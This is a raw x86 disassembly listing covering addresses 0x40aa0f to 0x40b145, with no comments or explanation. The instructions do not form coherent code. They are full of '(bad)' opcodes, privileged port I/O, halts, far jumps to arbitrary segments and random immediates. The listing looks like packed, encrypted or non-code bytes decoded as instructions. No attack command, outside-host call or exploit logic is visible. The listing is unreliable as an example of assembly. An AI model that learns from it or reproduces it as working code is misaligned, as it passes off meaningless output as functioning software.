  40aa0f:	fbld   TBYTE PTR [ebp-0x1e]
  40aa12:	out    0x12,eax
  40aa14:	into   
  40aa15:	and    DWORD PTR [ebp-0x1b881577],esi
  40aa1b:	(bad)  
  40aa1c:	das    
  40aa1d:	xor    edx,edx
  40aa1f:	sub    dl,ch
  40aa21:	xchg   edx,eax
  40aa22:	(bad)  
  40aa23:	mov    bh,0xf6
  40aa25:	mov    ah,0x51
  40aa27:	mov    BYTE PTR [edx],bl
  40aa29:	adc    ah,BYTE PTR [ebx]
  40aa2b:	(bad)  
  40aa2c:	xlat   BYTE PTR ds:[ebx]
  40aa2d:	lea    edx,[edi]
  40aa2f:	jmp    0x2247:0xdbbea31b
  40aa36:	mov    ah,0xf2
  40aa38:	hlt    
  40aa39:	loopne 0x40aa83
  40aa3b:	out    0xf8,eax
  40aa3d:	test   al,0x37
  40aa3f:	test   al,0xd4
  40aa41:	pop    eax
  40aa42:	test   ebp,0xb9f4c37f
  40aa48:	int    0x29
  40aa4a:	jmp    0x40aa86
  40aa4c:	inc    esi
  40aa4d:	push   ebx
  40aa4e:	aam    0x34
  40aa50:	mov    ebx,DWORD PTR [esi+0x7c]
  40aa53:	arpl   WORD PTR [ebx],si
  40aa55:	js     0x40aa3d
  40aa57:	mov    bl,0x4a
  40aa59:	test   eax,0x901e7443
  40aa5e:	adc    bl,BYTE PTR [esi]
  40aa60:	xor    ecx,DWORD PTR [ebx]
  40aa62:	out    dx,eax
  40aa63:	adc    BYTE PTR ds:[esi],cl
  40aa66:	ret    
  40aa67:	add    eax,0x5b2cecd9
  40aa6c:	adc    DWORD PTR [edx],0x5f
  40aa6f:	imul   esi,DWORD PTR [ecx-0x20],0xd3cdad84
  40aa76:	idiv   BYTE PTR [eax-0x2297f70c]
  40aa7c:	dec    ebx
  40aa7d:	(bad)  
  40aa7e:	xlat   BYTE PTR ds:[ebx]
  40aa7f:	mov    cl,0xb7
  40aa81:	ret    
  40aa82:	loop   0x40aa61
  40aa84:	or     BYTE PTR [esi],dh
  40aa86:	ror    DWORD PTR [ebx+0x4bc20fc7],cl
  40aa8c:	inc    ebp
  40aa8d:	inc    edi
  40aa8e:	sub    BYTE PTR [esi+0x4f305b9d],ah
  40aa94:	shl    edi,1
  40aa96:	cld    
  40aa97:	in     eax,dx
  40aa98:	mov    bh,0x84
  40aa9a:	mov    esp,0x420d75d5
  40aa9f:	xor    eax,DWORD PTR [ecx]
  40aaa1:	push   ss
  40aaa2:	std    
  40aaa3:	shl    ebx,cl
  40aaa5:	fs cdq 
  40aaa7:	inc    esp
  40aaa8:	lods   eax,DWORD PTR ds:[esi]
  40aaa9:	and    eax,DWORD PTR [edx]
  40aaab:	ds dec edi
  40aaad:	pusha  
  40aaae:	dec    edi
  40aaaf:	cmp    bh,dh
  40aab1:	gs call 0x5435:0x5e4c5b62
  40aab9:	and    BYTE PTR [edx-0x23258708],ch
  40aabf:	mov    bh,0x2a
  40aac1:	jmp    0x40aaaa
  40aac3:	pop    esp
  40aac4:	mov    dl,0xb3
  40aac6:	sbb    eax,0x20c096d
  40aacb:	push   ebp
  40aacc:	(bad)  
  40aacd:	in     al,dx
  40aace:	stc    
  40aacf:	cld    
  40aad0:	xchg   edi,eax
  40aad1:	jle    0x40aa63
  40aad3:	inc    edx
  40aad4:	daa    
  40aad5:	shl    BYTE PTR [eax+0x32],1
  40aad8:	xor    al,0xd6
  40aada:	loop   0x40aa8b
  40aadc:	fsubr  QWORD PTR [esi-0x28]
  40aadf:	mov    edi,0xcb8c27d5
  40aae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae5:	ins    DWORD PTR es:[edi],dx
  40aae6:	pop    esp
  40aae7:	inc    ebp
  40aae8:	stos   DWORD PTR es:[edi],eax
  40aae9:	mov    al,0x1a
  40aaeb:	ja     0x40aad7
  40aaed:	adc    DWORD PTR [ebx],0x54
  40aaf0:	clc    
  40aaf1:	sub    BYTE PTR [edi-0x69],dl
  40aaf4:	push   ss
  40aaf5:	stos   BYTE PTR es:[edi],al
  40aaf6:	sti    
  40aaf7:	xchg   ebp,eax
  40aaf8:	rcl    ch,0xe8
  40aafb:	out    0xf1,al
  40aafd:	cli    
  40aafe:	mov    al,0xa0
  40ab00:	jecxz  0x40aab4
  40ab02:	jge    0x40ab10
  40ab04:	sub    eax,0xd94be3d1
  40ab09:	mov    al,0x21
  40ab0b:	mov    WORD PTR [esp+ecx*8],ds
  40ab0e:	ss mov edi,0xf7a4c349
  40ab14:	ins    DWORD PTR es:[edi],dx
  40ab15:	jecxz  0x40ab6d
  40ab17:	inc    esi
  40ab18:	clc    
  40ab19:	xchg   edi,eax
  40ab1a:	pusha  
  40ab1b:	jns    0x40ab8d
  40ab1d:	les    ebp,FWORD PTR [edi+0x1a876e67]
  40ab23:	and    cl,ah
  40ab25:	xor    al,0x76
  40ab27:	mov    al,ds:0xcad650fc
  40ab2c:	xor    dh,al
  40ab2e:	lock mov eax,0xf7c7f817
  40ab34:	shl    DWORD PTR [ecx+ebx*4],1
  40ab37:	icebp  
  40ab38:	add    BYTE PTR [ebp+0x2f],cl
  40ab3b:	adc    DWORD PTR [esi-0x571f77ff],eax
  40ab41:	ficomp WORD PTR [ecx-0x6297b094]
  40ab47:	mov    ebp,DWORD PTR [esi]
  40ab49:	ss inc ecx
  40ab4b:	in     al,0x76
  40ab4d:	mov    ch,0xa7
  40ab4f:	hlt    
  40ab50:	cld    
  40ab51:	icebp  
  40ab52:	or     BYTE PTR [eax],0x7e
  40ab55:	dec    edx
  40ab56:	pop    edi
  40ab57:	outs   dx,DWORD PTR ds:[esi]
  40ab58:	jbe    0x40aadf
  40ab5a:	push   ecx
  40ab5b:	cmp    esi,esi
  40ab5d:	mov    edx,0x48aeb7af
  40ab62:	bound  ecx,QWORD PTR [ebp+0x35e60e3d]
  40ab68:	jne    0x40ab45
  40ab6a:	pop    ecx
  40ab6b:	aad    0x5e
  40ab6d:	call   0x6d60:0xebb27fe0
  40ab74:	add    al,0x13
  40ab76:	sbb    DWORD PTR [edi+0x44],ecx
  40ab79:	(bad)  
  40ab7a:	test   esi,ebp
  40ab7c:	rcl    BYTE PTR [ecx-0xf2b59c2],0xd1
  40ab83:	mov    eax,0x71e774eb
  40ab88:	jnp    0x40ab10
  40ab8a:	mov    edi,0x9149e640
  40ab8f:	cld    
  40ab90:	cmc    
  40ab91:	jne    0x40ab37
  40ab93:	dec    esi
  40ab94:	leave  
  40ab95:	dec    ecx
  40ab96:	lahf   
  40ab97:	and    ebx,esp
  40ab99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab9a:	ss ss aas 
  40ab9d:	shr    DWORD PTR [edx],1
  40ab9f:	mov    edx,0xae2eec
  40aba4:	jnp    0x40abb2
  40aba6:	fwait
  40aba7:	enter  0x7f0b,0x94
  40abab:	jbe    0x40abbb
  40abad:	jmp    0x40aba9
  40abaf:	mov    ch,0x65
  40abb1:	pop    edi
  40abb2:	popa   
  40abb3:	pusha  
  40abb4:	test   BYTE PTR [eax+0x16],bl
  40abb7:	int    0xcc
  40abb9:	pop    eax
  40abba:	mov    bl,BYTE PTR [ebx-0xeeabd14]
  40abc0:	fmul   st,st(1)
  40abc2:	or     ah,BYTE PTR [eax]
  40abc4:	ret    0x481b
  40abc7:	clc    
  40abc8:	shl    BYTE PTR [edi],1
  40abca:	and    bh,al
  40abcc:	inc    ebx
  40abcd:	imul   eax,DWORD PTR [edi],0xffffffdd
  40abd0:	push   edi
  40abd1:	push   ecx
  40abd2:	adc    eax,0x7b44291f
  40abd7:	ret    0x8267
  40abda:	dec    ebx
  40abdb:	popf   
  40abdc:	popa   
  40abdd:	sbb    DWORD PTR [eax+0x47d36c9a],0xda119278
  40abe7:	in     eax,dx
  40abe8:	and    al,0x96
  40abea:	push   edi
  40abeb:	lahf   
  40abec:	pop    eax
  40abed:	jmp    0x40ac09
  40abef:	or     esi,esp
  40abf1:	xchg   ebp,eax
  40abf2:	jne    0x40ac23
  40abf4:	ror    DWORD PTR [ecx-0x3e2395a8],cl
  40abfa:	pop    esp
  40abfb:	sbb    cl,cl
  40abfd:	daa    
  40abfe:	and    eax,0x8b3a6562
  40ac03:	(bad)  
  40ac04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac05:	fwait
  40ac06:	mov    al,0x51
  40ac08:	or     al,BYTE PTR [ebx-0x796d7150]
  40ac0e:	std    
  40ac0f:	adc    BYTE PTR [esi],bh
  40ac11:	or     dl,BYTE PTR [edi]
  40ac13:	ins    DWORD PTR es:[edi],dx
  40ac14:	and    eax,0x6aac9259
  40ac19:	lock and eax,DWORD PTR [eax-0x52794940]
  40ac20:	cli    
  40ac21:	stos   DWORD PTR es:[edi],eax
  40ac22:	mov    eax,0x921c6184
  40ac27:	sub    dl,ch
  40ac29:	cwde   
  40ac2a:	push   edi
  40ac2b:	ss ret 0x83b0
  40ac2f:	jg     0x40ac22
  40ac31:	aas    
  40ac32:	(bad)  
  40ac34:	pop    edi
  40ac35:	xchg   edx,eax
  40ac36:	loopne 0x40abca
  40ac38:	psubusb mm6,QWORD PTR [ebx+0x1a]
  40ac3c:	mov    dh,cl
  40ac3e:	popf   
  40ac3f:	jae    0x40acb0
  40ac41:	push   edx
  40ac42:	iret   
  40ac43:	fld    st(7)
  40ac45:	fwait
  40ac46:	outs   dx,BYTE PTR ds:[esi]
  40ac47:	(bad)  
  40ac48:	(bad)  
  40ac49:	cmp    BYTE PTR [edi+eiz*4-0x4be51f45],bh
  40ac50:	retf   
  40ac51:	outs   dx,DWORD PTR ds:[esi]
  40ac52:	sbb    DWORD PTR es:[edi+0x1b],edx
  40ac56:	js     0x40ac98
  40ac58:	shl    DWORD PTR [ecx-0x7],0x0
  40ac5c:	lods   al,BYTE PTR ds:[esi]
  40ac5d:	mov    ebp,0x5af9a62e
  40ac62:	fild   QWORD PTR [eax-0x2bbe6cde]
  40ac68:	mov    al,0x61
  40ac6a:	clc    
  40ac6b:	sub    eax,DWORD PTR [eax-0x491a33b1]
  40ac71:	xchg   ebp,eax
  40ac72:	pushf  
  40ac73:	jne    0x40acab
  40ac75:	or     bl,BYTE PTR ds:0x41013439
  40ac7b:	repnz outs dx,DWORD PTR ds:[esi]
  40ac7d:	sbb    BYTE PTR [ecx+0x32],bl
  40ac80:	jp     0x40ac6c
  40ac82:	xor    eax,DWORD PTR [ebx+0x29949913]
  40ac88:	dec    esp
  40ac89:	and    DWORD PTR [edi-0x64],0xfffffffa
  40ac8d:	fwait
  40ac8e:	add    ch,dl
  40ac90:	inc    edi
  40ac91:	cmova  edi,eax
  40ac94:	sub    BYTE PTR [ebx+0x7c],ch
  40ac97:	mov    esi,0x23c11d8
  40ac9c:	scas   eax,DWORD PTR es:[edi]
  40ac9d:	pop    edx
  40ac9e:	dec    eax
  40ac9f:	pop    es
  40aca0:	jmp    0xffa38f31
  40aca5:	fadd   DWORD PTR [esi+eax*4-0x255fe9cb]
  40acac:	and    DWORD PTR [eax+0x21],ecx
  40acaf:	jno    0x40ac7b
  40acb1:	pushf  
  40acb2:	jnp    0x40ac44
  40acb4:	ss addr16 push esp
  40acb7:	mov    WORD PTR [ebx+0x60b3824f],?
  40acbd:	lods   eax,DWORD PTR ds:[esi]
  40acbe:	push   eax
  40acbf:	adc    eax,0xa59c228b
  40acc4:	cs ds jmp 0x40ad18
  40acc8:	call   0xb98:0xa8647797
  40accf:	xor    edx,DWORD PTR [eax]
  40acd1:	jae    0x40ad3a
  40acd3:	push   es
  40acd4:	add    al,0x2b
  40acd6:	test   DWORD PTR [eax],esi
  40acd8:	xchg   ebp,eax
  40acd9:	adc    dl,dl
  40acdb:	pusha  
  40acdc:	shr    DWORD PTR [esi-0x39],cl
  40acdf:	or     ebx,DWORD PTR [ebp+0x37]
  40ace2:	add    edx,ecx
  40ace4:	(bad)  
  40ace5:	(bad)  
  40ace6:	and    cl,dh
  40ace8:	xchg   esi,eax
  40ace9:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acec:	jecxz  0x40acf2
  40acee:	xchg   edi,eax
  40acef:	movups XMMWORD PTR [ecx-0x9353906],xmm6
  40acf6:	jle    0x40acc6
  40acf8:	cmp    DWORD PTR [esi+0x12b8dd0c],ecx
  40acfe:	outs   dx,DWORD PTR ds:[esi]
  40acff:	add    edi,DWORD PTR [esi]
  40ad01:	push   eax
  40ad02:	push   edx
  40ad03:	and    DWORD PTR [ebp-0x3bb52082],esp
  40ad09:	add    al,ah
  40ad0b:	inc    esp
  40ad0c:	rcl    BYTE PTR [ebx],cl
  40ad0e:	ret    
  40ad0f:	out    dx,eax
  40ad10:	in     eax,dx
  40ad11:	imul   eax,DWORD PTR [ebx-0x51],0x4e3bfcec
  40ad18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad1a:	xchg   edx,eax
  40ad1b:	loope  0x40acd7
  40ad1d:	cld    
  40ad1e:	and    al,BYTE PTR [ebx-0x5e]
  40ad21:	add    al,0xef
  40ad23:	jbe    0x40ad98
  40ad25:	add    dl,ah
  40ad27:	cmp    DWORD PTR [ecx-0x5bdd055],ecx
  40ad2d:	pop    ss
  40ad2e:	call   0xb009dc03
  40ad33:	pop    ecx
  40ad34:	adc    ecx,DWORD PTR [eax]
  40ad36:	add    al,BYTE PTR [edx]
  40ad38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad39:	adc    edi,DWORD PTR [esi]
  40ad3b:	push   0x2f6a0e25
  40ad40:	mov    dl,0xd9
  40ad42:	leave  
  40ad43:	aaa    
  40ad44:	es push cs
  40ad46:	pop    ebx
  40ad47:	shr    DWORD PTR [edx+0x411be6f0],1
  40ad4d:	inc    ebp
  40ad4e:	xor    esi,ebp
  40ad50:	jge    0x40ad89
  40ad52:	(bad)  
  40ad53:	xlat   BYTE PTR ds:[ebx]
  40ad54:	scas   al,BYTE PTR es:[edi]
  40ad55:	inc    esp
  40ad56:	xor    BYTE PTR [eax],ch
  40ad58:	nop
  40ad59:	add    esi,DWORD PTR [ebx]
  40ad5b:	push   ecx
  40ad5c:	mov    dl,0xe3
  40ad5e:	pop    ds
  40ad5f:	mov    esp,0x5f6aef86
  40ad64:	data16 das 
  40ad66:	and    edi,ebp
  40ad68:	loope  0x40ad7c
  40ad6a:	retf   0x8749
  40ad6d:	mov    BYTE PTR [esi],dh
  40ad6f:	push   0xffffffdd
  40ad71:	jle    0x40ad7e
  40ad73:	xor    ebx,DWORD PTR [eax+0x3076a91e]
  40ad79:	pop    ecx
  40ad7a:	sbb    ah,BYTE PTR [edx]
  40ad7c:	sar    BYTE PTR [ebx-0x367a06b3],0x6b
  40ad83:	jl     0x40ade3
  40ad85:	sar    BYTE PTR [eax+0x30],0x33
  40ad89:	mov    cl,0xb1
  40ad8b:	and    esp,DWORD PTR [ebp*2-0x48676e58]
  40ad92:	or     eax,0xb46fbf6f
  40ad97:	xchg   esp,eax
  40ad98:	xor    al,0xea
  40ad9a:	adc    al,0x55
  40ad9c:	shr    BYTE PTR ds:0xa94e6a66,0xba
  40ada3:	inc    edx
  40ada4:	inc    esp
  40ada5:	push   edx
  40ada6:	fistp  DWORD PTR [eax]
  40ada8:	cmp    cl,BYTE PTR [edx+0x45]
  40adab:	jmp    0x179c:0x66a7baf0
  40adb2:	adc    BYTE PTR [ebp-0x49],dl
  40adb5:	mov    ebx,esi
  40adb7:	xchg   esp,eax
  40adb8:	and    eax,0x769fcfd
  40adbd:	fs add eax,0x69a0eb46
  40adc3:	in     al,dx
  40adc4:	shl    BYTE PTR [ecx+0x62],cl
  40adc7:	or     al,0xce
  40adc9:	into   
  40adca:	aad    0x67
  40adcc:	retf   0xb511
  40adcf:	fmul   st(2),st
  40add1:	push   ecx
  40add2:	xchg   ebx,eax
  40add3:	xor    al,0x77
  40add5:	ror    DWORD PTR [edi-0x14],cl
  40add8:	xchg   ebp,eax
  40add9:	push   ebp
  40adda:	shr    BYTE PTR [ecx+0x47044303],0xa7
  40ade1:	or     eax,0xc86f1ed0
  40ade6:	clc    
  40ade7:	out    dx,eax
  40ade8:	cmp    edx,ecx
  40adea:	or     BYTE PTR [ebx+0x9],al
  40aded:	aam    0x57
  40adef:	add    BYTE PTR [eax+0x16482c82],cl
  40adf5:	xor    esp,DWORD PTR [edi]
  40adf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf8:	in     al,dx
  40adf9:	adc    ebx,DWORD PTR [edi]
  40adfb:	rcl    WORD PTR [esi+0x4d],1
  40adff:	push   cs
  40ae00:	sahf   
  40ae01:	and    BYTE PTR [eax],cl
  40ae03:	cmp    eax,0xf28e702a
  40ae08:	sti    
  40ae09:	sub    eax,0x8936d9e7
  40ae0e:	les    edi,FWORD PTR [ecx+0x50]
  40ae11:	xchg   edx,eax
  40ae12:	stc    
  40ae13:	pop    ecx
  40ae14:	shl    BYTE PTR [ebx],cl
  40ae16:	mov    ecx,0x9f36660
  40ae1b:	sub    eax,0x65d1283
  40ae20:	sub    eax,0x1adca836
  40ae25:	inc    edx
  40ae26:	xchg   ebp,eax
  40ae27:	pop    ebx
  40ae28:	sbb    ecx,DWORD PTR [eax-0x11]
  40ae2b:	push   ecx
  40ae2c:	dec    edi
  40ae2d:	mov    ebp,0xd14703e4
  40ae32:	jno    0x40ade4
  40ae34:	mov    BYTE PTR [ecx+0x3f],cl
  40ae37:	push   ebp
  40ae38:	jb     0x40ae25
  40ae3a:	xchg   esi,eax
  40ae3b:	mov    ebp,ebp
  40ae3d:	mov    bl,0x2d
  40ae3f:	inc    esp
  40ae40:	fs enter 0x9339,0x1c
  40ae45:	ja     0x40ae01
  40ae47:	out    dx,al
  40ae48:	repnz push ds
  40ae4a:	dec    esi
  40ae4b:	inc    edi
  40ae4c:	sub    al,0xcd
  40ae4e:	ins    BYTE PTR es:[edi],dx
  40ae4f:	inc    DWORD PTR [eax+0x592db400]
  40ae55:	mov    bh,0x34
  40ae57:	dec    esp
  40ae58:	cmp    BYTE PTR [ecx],cl
  40ae5a:	push   esp
  40ae5b:	sub    eax,0x6cbb73dc
  40ae60:	or     eax,0xfcb927e3
  40ae65:	test   al,0x65
  40ae67:	mov    WORD PTR [ebx-0x1d979cc3],ds
  40ae6d:	ret    
  40ae6e:	xor    BYTE PTR [ebp+0x2a],bl
  40ae71:	add    al,0x8a
  40ae73:	cwde   
  40ae74:	in     eax,0x60
  40ae76:	adc    ah,BYTE PTR [edx]
  40ae78:	pop    es
  40ae79:	jle    0x40ae1e
  40ae7b:	xchg   bl,al
  40ae7d:	retf   0x393b
  40ae80:	and    ch,BYTE PTR [esi]
  40ae82:	cmp    ecx,ebp
  40ae84:	out    0xeb,al
  40ae86:	retf   0x5da4
  40ae89:	xchg   esp,eax
  40ae8a:	add    esi,esi
  40ae8c:	pop    ecx
  40ae8d:	add    DWORD PTR [ecx],esp
  40ae8f:	sti    
  40ae90:	sbb    BYTE PTR [eax-0x2c],0x87
  40ae94:	sub    al,0xd3
  40ae96:	daa    
  40ae97:	or     bh,BYTE PTR [edx+0x1898db7d]
  40ae9d:	inc    edi
  40ae9e:	pop    esi
  40ae9f:	mov    edi,0x4940a36f
  40aea4:	pop    esi
  40aea5:	aaa    
  40aea6:	icebp  
  40aea7:	jae    0x40ae57
  40aea9:	xor    al,0x10
  40aeab:	jecxz  0x40ae65
  40aead:	out    dx,al
  40aeae:	sahf   
  40aeaf:	popf   
  40aeb0:	inc    esp
  40aeb1:	adc    DWORD PTR [ecx],0xa76a4fe7
  40aeb7:	mov    eax,0xde1122fe
  40aebc:	jno    0x40ae4c
  40aebe:	adc    DWORD PTR [esp+eax*1+0x2619f537],0x4e
  40aec6:	(bad)  
  40aec7:	fdivp  st(6),st
  40aec9:	push   0x73ec29a3
  40aece:	pop    ss
  40aecf:	jb     0x40af03
  40aed1:	mov    ds:0x630f7d4a,al
  40aed6:	pop    es
  40aed7:	or     al,0xcd
  40aed9:	push   esp
  40aeda:	push   esi
  40aedb:	out    0x2b,al
  40aedd:	je     0x40ae88
  40aedf:	push   edx
  40aee0:	pop    eax
  40aee1:	cmp    eax,0x5c1fa332
  40aee6:	inc    ecx
  40aee7:	es pop edi
  40aee9:	pop    esi
  40aeea:	jbe    0x40af6b
  40aeec:	adc    edx,edx
  40aeee:	ret    
  40aeef:	or     al,0x2c
  40aef1:	jg     0x40af5d
  40aef3:	ret    0x45c7
  40aef6:	sub    DWORD PTR [ecx+edi*2],esp
  40aef9:	jb     0x40af11
  40aefb:	mov    bl,0xda
  40aefd:	dec    ebx
  40aefe:	pushf  
  40aeff:	in     al,0x88
  40af01:	push   ecx
  40af02:	sbb    esi,ecx
  40af04:	cmp    BYTE PTR [edx-0x541321f8],dh
  40af0a:	je     0x40af1c
  40af0c:	mov    al,ds:0xc338fe90
  40af11:	inc    bh
  40af13:	and    bh,al
  40af15:	or     dl,BYTE PTR [edx+0x1d]
  40af18:	push   ebp
  40af19:	test   eax,0xfb11284
  40af1e:	jp     0x40af9f
  40af20:	sbb    esp,esi
  40af22:	ret    0x8f37
  40af25:	xchg   esi,eax
  40af26:	cmc    
  40af27:	dec    edx
  40af28:	sub    DWORD PTR [eax+0x77573b26],ebx
  40af2e:	ja     0x40af0b
  40af30:	icebp  
  40af31:	sbb    eax,0xbe2b5dff
  40af36:	push   ebx
  40af37:	std    
  40af38:	out    dx,eax
  40af39:	js     0x40af4f
  40af3b:	mov    dl,0xd2
  40af3d:	mov    edi,0x41057d85
  40af42:	mov    ah,0xee
  40af44:	and    al,0x86
  40af46:	xlat   BYTE PTR ds:[ebx]
  40af47:	sub    eax,0xa0f16635
  40af4c:	push   eax
  40af4d:	mov    ds:0xa7890795,al
  40af52:	mov    bl,0xb8
  40af54:	outs   dx,DWORD PTR ds:[esi]
  40af55:	shr    esi,0x46
  40af58:	test   DWORD PTR [ebx+0xb],esi
  40af5b:	scas   al,BYTE PTR es:[edi]
  40af5c:	(bad)  
  40af5d:	loop   0x40af3c
  40af5f:	push   ecx
  40af60:	inc    esi
  40af61:	in     al,0xb7
  40af63:	call   0x34bbe8c1
  40af68:	add    BYTE PTR [esi-0x1a],0x6b
  40af6c:	loope  0x40afca
  40af6e:	test   eax,0xdab21a76
  40af73:	aam    0x22
  40af75:	adc    dh,BYTE PTR [eax]
  40af77:	loop   0x40afcc
  40af79:	mov    edi,cs
  40af7b:	or     BYTE PTR [ebx],al
  40af7d:	inc    edx
  40af7e:	fs push ecx
  40af80:	mov    ecx,0xdf3d2529
  40af85:	jno    0xf176dc88
  40af8b:	mov    esi,0xeacf0cbc
  40af90:	cmp    DWORD PTR [ebp-0x1c987869],0xfd36bf29
  40af9a:	mov    BYTE PTR [eax],bh
  40af9c:	sub    al,0xa8
  40af9e:	scas   al,BYTE PTR es:[edi]
  40af9f:	mov    eax,ds:0xe4eb772
  40afa4:	arpl   WORD PTR ds:0x84c48784,di
  40afaa:	jnp    0x40b029
  40afac:	cld    
  40afad:	pusha  
  40afae:	add    ch,BYTE PTR [edi+eax*8+0xc]
  40afb2:	cwde   
  40afb3:	dec    ecx
  40afb4:	cmc    
  40afb5:	dec    ebx
  40afb6:	fild   DWORD PTR [ecx]
  40afb8:	dec    edi
  40afb9:	sub    BYTE PTR [edx],bl
  40afbb:	aaa    
  40afbc:	push   0xffffffed
  40afbe:	and    ch,BYTE PTR [edi]
  40afc0:	(bad)  
  40afc1:	fist   DWORD PTR [edx-0x59]
  40afc4:	mov    eax,ds:0xa167e9ef
  40afc9:	add    edi,edi
  40afcb:	xchg   edx,eax
  40afcc:	dec    esp
  40afcd:	xchg   ecx,eax
  40afce:	ins    DWORD PTR es:[edi],dx
  40afcf:	pop    es
  40afd0:	sbb    ecx,edx
  40afd2:	push   esi
  40afd3:	sub    ebp,DWORD PTR ds:0x69361ab2
  40afd9:	jp     0x40b00f
  40afdb:	sub    ebx,DWORD PTR [edx-0x2e8bdf7d]
  40afe1:	cmp    edi,edx
  40afe3:	js     0x40af80
  40afe5:	adc    DWORD PTR [ebp-0xb],0x65
  40afe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afea:	xchg   esp,eax
  40afeb:	mov    edx,0x15e2bab1
  40aff0:	scas   al,BYTE PTR es:[edi]
  40aff1:	stos   DWORD PTR es:[edi],eax
  40aff2:	jle    0x40b00f
  40aff4:	or     al,0xa3
  40aff6:	cmp    dl,BYTE PTR [edi]
  40aff8:	adc    ebx,edi
  40affa:	xor    esp,DWORD PTR [edx-0x76]
  40affd:	test   al,0x28
  40afff:	xchg   DWORD PTR [esi-0x6133f0a6],ebp
  40b005:	lock cmc 
  40b007:	cmp    eax,0x12f6fc87
  40b00c:	f2xm1  
  40b00e:	sbb    BYTE PTR [ebx],0x86
  40b011:	sub    eax,0x6064c82b
  40b016:	test   eax,0xca4424e4
  40b01b:	jle    0x40b023
  40b01d:	cmc    
  40b01e:	inc    edi
  40b01f:	call   0x415a627c
  40b024:	sahf   
  40b025:	popa   
  40b026:	xor    al,0x23
  40b028:	inc    edi
  40b029:	aam    0x29
  40b02b:	or     BYTE PTR [eax+0x6b],al
  40b02e:	cmpxchg DWORD PTR [ecx],ecx
  40b031:	jne    0x40afeb
  40b033:	int3   
  40b034:	xor    BYTE PTR [ecx-0x56],0x9b
  40b038:	pop    ebx
  40b039:	mov    ch,0x63
  40b03b:	dec    edx
  40b03c:	add    BYTE PTR ds:0x638032ca,ah
  40b042:	daa    
  40b043:	aaa    
  40b044:	inc    ebx
  40b045:	arpl   WORD PTR [ecx-0x70],sp
  40b048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b049:	ret    
  40b04a:	clc    
  40b04b:	outs   dx,BYTE PTR ds:[esi]
  40b04c:	int3   
  40b04d:	xor    DWORD PTR [ebp-0x45],ecx
  40b050:	xchg   DWORD PTR [ebx],ecx
  40b052:	ja     0x40b07b
  40b054:	cmp    eax,0x7789fc35
  40b059:	push   eax
  40b05a:	and    eax,0x47052989
  40b05f:	pop    eax
  40b060:	test   eax,0x5f6c1dc6
  40b065:	sub    edi,DWORD PTR [eax]
  40b067:	rol    DWORD PTR [ebx-0x67cd3e12],1
  40b06d:	inc    eax
  40b06e:	mov    bl,0xe9
  40b070:	jns    0x40b031
  40b072:	dec    eax
  40b073:	jbe    0x40b046
  40b075:	cwde   
  40b076:	cmp    edx,ecx
  40b078:	loopne 0x40b04c
  40b07a:	xor    BYTE PTR [ebp-0x68515e4d],0x91
  40b081:	sub    dh,bh
  40b083:	inc    edx
  40b084:	aaa    
  40b085:	xchg   esi,eax
  40b086:	test   esp,ecx
  40b088:	xchg   esi,eax
  40b089:	jno    0x40b039
  40b08b:	repnz or ah,cl
  40b08e:	test   al,0x21
  40b090:	xchg   edx,eax
  40b091:	cmp    esi,DWORD PTR [edi]
  40b093:	retf   
  40b094:	mov    esp,0x8dcf87ad
  40b099:	sti    
  40b09a:	mov    esi,0x12b3368c
  40b09f:	in     al,0xc1
  40b0a1:	fcomp  st(3)
  40b0a3:	test   eax,0x229e0b86
  40b0a8:	neg    BYTE PTR [ecx+0x3474a681]
  40b0ae:	or     eax,0xec4abd93
  40b0b3:	xchg   ecx,eax
  40b0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0b5:	push   ds
  40b0b6:	outs   dx,BYTE PTR ds:[esi]
  40b0b7:	in     eax,dx
  40b0b8:	out    dx,eax
  40b0b9:	fsubr  QWORD PTR [edi-0x22]
  40b0bc:	add    al,0x5e
  40b0be:	shl    DWORD PTR [ebx+0x60a72a7e],1
  40b0c4:	pop    es
  40b0c5:	xchg   esp,eax
  40b0c6:	and    eax,0x2bd56200
  40b0cb:	or     al,0xcd
  40b0cd:	push   ebp
  40b0ce:	mov    esp,ecx
  40b0d0:	cld    
  40b0d1:	out    0x69,al
  40b0d3:	(bad)  
  40b0d4:	pushf  
  40b0d5:	mov    ebx,0x5b5d9636
  40b0da:	shl    DWORD PTR [esi+0x39706fbe],0x1a
  40b0e1:	inc    edi
  40b0e2:	or     al,0x17
  40b0e4:	imul   BYTE PTR [eax+0x1e]
  40b0e7:	or     DWORD PTR [edi+0x48675e6e],edx
  40b0ed:	aam    0x26
  40b0ef:	daa    
  40b0f0:	data16 lock jo 0x40b0e9
  40b0f4:	outs   dx,DWORD PTR ds:[esi]
  40b0f5:	push   cs
  40b0f6:	sbb    DWORD PTR [ebp+edx*8-0x56],eax
  40b0fa:	pop    ebp
  40b0fb:	adc    DWORD PTR [ebx],0x91aa52a0
  40b101:	(bad)  
  40b102:	in     eax,0x56
  40b104:	xchg   esp,eax
  40b105:	jbe    0x40b0b2
  40b107:	xlat   BYTE PTR ds:[ebx]
  40b108:	mov    WORD PTR [eax+ebx*2-0x7c],gs
  40b10c:	retf   
  40b10d:	mov    eax,0x3397421
  40b112:	inc    esi
  40b113:	dec    ebx
  40b114:	fadd   DWORD PTR [edx-0x10]
  40b117:	ja     0x40b191
  40b119:	in     eax,dx
  40b11a:	imul   edx,DWORD PTR [eax+esi*4],0x3cefeba1
  40b121:	adc    eax,0xf6777a1a
  40b126:	iret   
  40b127:	sub    esi,0xbc7aab9c
  40b12d:	push   edi
  40b12e:	mov    ss,WORD PTR [esi-0x77d836dd]
  40b134:	xchg   edx,eax
  40b135:	mov    ecx,0xb96e2889
  40b13a:	daa    
  40b13b:	(bad)  
  40b13c:	or     eax,DWORD PTR [esp+ecx*2]
  40b13f:	mov    BYTE PTR [ebx+0x7bbfe67e],dl
  40b145:	mov    BYTE PTR [ebx+0x29a34c73],dl
